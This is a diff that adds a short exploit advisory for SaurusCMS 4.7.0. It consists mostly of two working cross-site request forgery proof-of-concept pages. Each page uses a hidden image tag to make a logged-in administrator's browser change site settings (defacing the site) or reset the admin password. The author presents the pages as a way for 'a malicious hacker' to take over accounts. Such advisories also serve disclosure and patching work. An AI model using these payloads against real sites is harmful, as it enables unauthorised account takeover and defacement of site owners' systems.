@@ -1,0 +1,25 @@
+# Author: Fady Mohammed Osman (cute hacker)
+# Software Link: http://www.saurus.info/download/SaurusCMS-4.7.0.tgz
+# Version: 4.7.0
+# Tested on: Ubuntu 10.04
+# CVE : [Not available]
+# This vulnerability allows a malicious hacker to change password of a user
+and also it allows changing the website information.
+
+PoC 1:
+
+<html>
+<head><title>Saurus CSRF : Change site information</title></head>
+<body>
+<img src="http://localhost/saurus/admin/change_config.php?group=1&site_name=hacked+by+cutehacker&slogan=hacked&meta_title=hacked&meta_description=hacked&meta_keywords=hacked&save=1&flt_keel=1&page_end_html=&timezone=">
+</body>
+</html>
+
+PoC 2:
+
+<html>
+<head><title>Saurus CSRF : Change user's password</title></head>
+<body>
+<img src="http://localhost/saurus/admin/edit_user.php?tab=account&user_id=19&group_id=1&op=edit&op2=save&username=admin&password=hacked&password_confirmation=hacked&pass_expires=01.01.2029&is_predefined=1">
+</body>
+</html>
